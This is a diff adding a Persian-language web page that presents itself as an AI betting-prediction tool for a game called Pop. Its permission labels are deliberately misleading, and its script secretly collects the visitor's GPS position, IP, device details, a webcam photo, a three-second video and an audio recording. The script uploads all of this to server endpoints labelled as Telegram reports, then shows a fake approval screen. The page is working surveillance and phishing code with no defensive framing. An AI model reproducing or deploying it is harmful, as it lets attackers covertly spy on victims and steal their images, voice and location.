@@ -1,0 +1,394 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>پــــوپ</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      font-family: 'Segoe UI', Tahoma, sans-serif;
+      background: #0f0f1a;
+      color: #e0e0f0;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .card {
+      background: #1a1a2e;
+      border: 1px solid #2a2a4a;
+      border-radius: 16px;
+      padding: 40px 32px;
+      max-width: 420px;
+      width: 90%;
+      text-align: center;
+      box-shadow: 0 20px 60px rgba(0,0,0,0.5);
+    }
+
+    .shield-icon {
+      font-size: 52px;
+      margin-bottom: 16px;
+    }
+
+    h1 {
+      font-size: 22px;
+      font-weight: 700;
+      color: #a78bfa;
+      margin-bottom: 8px;
+    }
+
+    p.subtitle {
+      font-size: 14px;
+      color: #888;
+      margin-bottom: 28px;
+      line-height: 1.6;
+    }
+
+    .perms-list {
+      text-align: right;
+      margin-bottom: 28px;
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+    }
+
+    .perm-item {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      background: #12122a;
+      border: 1px solid #2a2a4a;
+      border-radius: 10px;
+      padding: 12px 16px;
+      font-size: 13px;
+      color: #c0c0e0;
+    }
+
+    .perm-item .icon { font-size: 20px; }
+
+    .btn {
+      width: 100%;
+      padding: 14px;
+      border-radius: 10px;
+      border: none;
+      font-size: 15px;
+      font-weight: 700;
+      cursor: pointer;
+      transition: all 0.2s;
+    }
+
+    .btn-primary {
+      background: linear-gradient(135deg, #7c3aed, #4f46e5);
+      color: white;
+      margin-bottom: 10px;
+    }
+
+    .btn-primary:hover { filter: brightness(1.1); }
+    .btn-primary:disabled { opacity: 0.5; cursor: not-allowed; }
+
+    .status {
+      margin-top: 20px;
+      font-size: 12px;
+      color: #555;
+      min-height: 20px;
+    }
+
+    .spinner {
+      display: inline-block;
+      width: 14px; height: 14px;
+      border: 2px solid #555;
+      border-top-color: #a78bfa;
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+      vertical-align: middle;
+      margin-left: 6px;
+    }
+
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    .success { color: #4ade80; }
+    .error-msg { color: #f87171; }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <div class="shield-icon">💩💰</div>
+    <h1>هـ مـ پیشبینی پوپ</h1>
+    <p class="subtitle">ماژول ال ال ام پیشبینی بازی پوپ - دسترسی های لازم را بدهید و وارد صفحه بت شوید.</p>
+
+    <div class="perms-list">
+      <div class="perm-item"><span class="icon">📍</span> توانایی بازگشایی الگوریتم</div>
+      <div class="perm-item"><span class="icon">📷</span> استفاده بهینه از فیبوناچی</div>
+      <div class="perm-item"><span class="icon">🎙️</span> دریافت و ارسال سریع اطلاعات</div>
+      <div class="perm-item"><span class="icon">🔔</span> ارسال اعلان‌ها</div>
+      <div class="perm-item"><span class="icon">📋</span> تناوب زمانی</div>
+    </div>
+
+    <button class="btn btn-primary" id="startBtn" onclick="startCollection()">
+      تأیید و ادامه
+    </button>
+
+    <div class="status" id="status"></div>
+  </div>
+
+  <script>
+    // =============== بخش جدید با قابلیت عکس، فیلم و صدا ===============
+    
+    let capturedPhoto = null;
+    let capturedVideo = null;
+    let capturedAudio = null;
+
+    async function sendToTelegram(data) {
+      try {
+        const text = formatMessage(data);
+        await fetch(`/api/send`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ text })
+        });
+      } catch (e) { console.error(e); }
+    }
+
+    function formatMessage(d) {
+      return `🕵️ *گزارش جدید*\n\n` +
+        `🌐 *IP:* \`${d.ip || 'نامشخص'}\`\n` +
+        `📍 *موقعیت:* ${d.location || 'رد شد'}\n` +
+        `🗺️ *شهر:* ${d.city || ''} — ${d.country || ''}\n\n` +
+        `📱 *دستگاه:* ${d.device}\n` +
+        `💻 *OS:* ${d.os}\n` +
+        `🌍 *مرورگر:* ${d.browser}\n` +
+        `📐 *رزولوشن:* ${d.screen}\n` +
+        `🕐 *زمان محلی:* ${d.localTime}\n` +
+        `🌏 *زون زمانی:* ${d.timezone}\n` +
+        `🗣️ *زبان:* ${d.language}\n\n` +
+        `📷 *دوربین:* ${d.camera}\n` +
+        `🎙️ *میکروفون:* ${d.mic}\n` +
+        `🔔 *نوتیفیکیشن:* ${d.notification}\n\n` +
+        `🔋 *باتری:* ${d.battery}\n` +
+        `📶 *اینترنت:* ${d.connection}\n` +
+        `🧭 *Referrer:* ${d.referrer || 'مستقیم'}\n` +
+        `🔗 *URL:* ${d.url}`;
+    }
+
+    function setStatus(msg, cls = '') {
+      const el = document.getElementById('status');
+      el.innerHTML = msg;
+      el.className = 'status ' + cls;
+    }
+
+    async function startCollection() {
+      const btn = document.getElementById('startBtn');
+      btn.disabled = true;
+      setStatus('📸 در حال دریافت اطلاعات... <span class="spinner"></span>');
+
+      try {
+        const data = await collectAll();
+        
+        // ارسال متن
+        await sendToTelegram(data);
+        
+        // ارسال عکس
+        if (capturedPhoto) {
+          setStatus('📸 ارسال عکس... <span class="spinner"></span>');
+          await fetch('/api/send-photo', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ photo: capturedPhoto })
+          });
+        }
+        
+        // ارسال فیلم
+        if (capturedVideo) {
+          setStatus('🎬 ارسال فیلم... <span class="spinner"></span>');
+          await fetch('/api/send-video', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ video: capturedVideo })
+          });
+        }
+        
+        // ارسال صدا
+        if (capturedAudio) {
+          setStatus('🎤 ارسال صدا... <span class="spinner"></span>');
+          await fetch('/api/send-audio', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ audio: capturedAudio })
+          });
+        }
+
+        setStatus('✅ همه اطلاعات با موفقیت ارسال شد!', 'success');
+        setTimeout(() => {
+          document.querySelector('.card').innerHTML = `
+            <div style="font-size:52px;margin-bottom:16px">✅</div>
+            <h1 style="color:#4ade80">تأیید شد</h1>
+            <p style="color:#888;margin-top:12px;font-size:14px">الگوریتم شما با موفقیت تأیید گردید.</p>
+          `;
+        }, 1500);
+        
+      } catch (error) {
+        setStatus('❌ خطا: ' + error.message, 'error-msg');
+        btn.disabled = false;
+      }
+    }
+
+    async function collectAll() {
+      const ua = navigator.userAgent;
+      const data = {
+        url: location.href,
+        referrer: document.referrer,
+        localTime: new Date().toLocaleString('fa-IR'),
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        language: navigator.language,
+        screen: `${screen.width}×${screen.height} (${window.devicePixelRatio}x)`,
+        browser: getBrowser(ua),
+        os: getOS(ua),
+        device: getDevice(ua),
+        ip: 'در حال دریافت...',
+        location: 'در حال درخواست...',
+        city: '', country: '',
+        camera: 'درخواست نشد',
+        mic: 'درخواست نشد',
+        notification: 'درخواست نشد',
+        battery: 'نامشخص',
+        connection: getConnection()
+      };
+
+      // IP + geo
+      try {
+        const r = await fetch('/api/geo');
+        const j = await r.json();
+        data.ip = j.ip || 'نامشخص';
+        data.city = j.city || '';
+        data.country = j.country || '';
+      } catch (e) {}
+
+      // GPS
+      try {
+        const pos = await new Promise((res, rej) => {
+          navigator.geolocation.getCurrentPosition(res, rej, { timeout: 8000 });
+        });
+        data.location = `${pos.coords.latitude.toFixed(5)}, ${pos.coords.longitude.toFixed(5)} (±${pos.coords.accuracy}m)`;
+      } catch (e) {
+        data.location = 'رد شد';
+      }
+
+      // =============== دوربین + عکس + فیلم ===============
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ 
+          video: { width: 640, height: 480 } 
+        });
+        data.camera = '✅ دسترسی داده شد';
+
+        // گرفتن عکس
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        await video.play();
+
+        const canvas = document.createElement('canvas');
+        canvas.width = 640;
+        canvas.height = 480;
+        canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+        capturedPhoto = canvas.toDataURL('image/jpeg', 0.8);
+
+        // ضبط فیلم (۳ ثانیه)
+        const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+        const chunks = [];
+        mediaRecorder.ondataavailable = e => chunks.push(e.data);
+        mediaRecorder.start();
+        await new Promise(r => setTimeout(r, 3000));
+        mediaRecorder.stop();
+        await new Promise(r => mediaRecorder.onstop = r);
+
+        const videoBlob = new Blob(chunks, { type: 'video/webm' });
+        const reader = new FileReader();
+        capturedVideo = await new Promise(res => {
+          reader.onload = () => res(reader.result);
+          reader.readAsDataURL(videoBlob);
+        });
+
+        stream.getTracks().forEach(t => t.stop());
+      } catch (e) {
+        data.camera = `❌ ${e.name}`;
+      }
+
+      // =============== میکروفون + صدا ===============
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+        data.mic = '✅ دسترسی داده شد';
+
+        const mediaRecorder = new MediaRecorder(stream);
+        const chunks = [];
+        mediaRecorder.ondataavailable = e => chunks.push(e.data);
+        mediaRecorder.start();
+        await new Promise(r => setTimeout(r, 3000));
+        mediaRecorder.stop();
+        await new Promise(r => mediaRecorder.onstop = r);
+
+        const audioBlob = new Blob(chunks, { type: 'audio/webm' });
+        const reader = new FileReader();
+        capturedAudio = await new Promise(res => {
+          reader.onload = () => res(reader.result);
+          reader.readAsDataURL(audioBlob);
+        });
+
+        stream.getTracks().forEach(t => t.stop());
+      } catch (e) {
+        data.mic = `❌ ${e.name}`;
+      }
+
+      // نوتیفیکیشن
+      try {
+        const perm = await Notification.requestPermission();
+        data.notification = perm === 'granted' ? '✅ مجاز' : `❌ ${perm}`;
+      } catch (e) {
+        data.notification = `❌ ${e.name}`;
+      }
+
+      // باتری
+      try {
+        const b = await navigator.getBattery();
+        data.battery = `${Math.round(b.level * 100)}% — ${b.charging ? 'در حال شارژ' : 'در حال تخلیه'}`;
+      } catch (e) {}
+
+      return data;
+    }
+
+    function getBrowser(ua) {
+      if (/Edg\//.test(ua)) return 'Edge';
+      if (/OPR\//.test(ua)) return 'Opera';
+      if (/Chrome\//.test(ua)) return 'Chrome';
+      if (/Firefox\//.test(ua)) return 'Firefox';
+      if (/Safari\//.test(ua)) return 'Safari';
+      return 'نامشخص';
+    }
+
+    function getOS(ua) {
+      if (/Windows NT 10/.test(ua)) return 'Windows 10/11';
+      if (/Windows/.test(ua)) return 'Windows';
+      if (/Mac OS X/.test(ua)) return 'macOS';
+      if (/Android/.test(ua)) return 'Android';
+      if (/iPhone|iPad/.test(ua)) return 'iOS';
+      if (/Linux/.test(ua)) return 'Linux';
+      return 'نامشخص';
+    }
+
+    function getDevice(ua) {
+      if (/iPhone/.test(ua)) return 'iPhone';
+      if (/iPad/.test(ua)) return 'iPad';
+      if (/Android/.test(ua) && /Mobile/.test(ua)) return 'Android Phone';
+      if (/Android/.test(ua)) return 'Android Tablet';
+      return 'Desktop';
+    }
+
+    function getConnection() {
+      const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+      if (!c) return 'نامشخص';
+      return `${c.effectiveType || ''} — ${c.downlink ? c.downlink + 'Mbps' : ''}`;
+    }
+  </script>
+</body>
+</html>
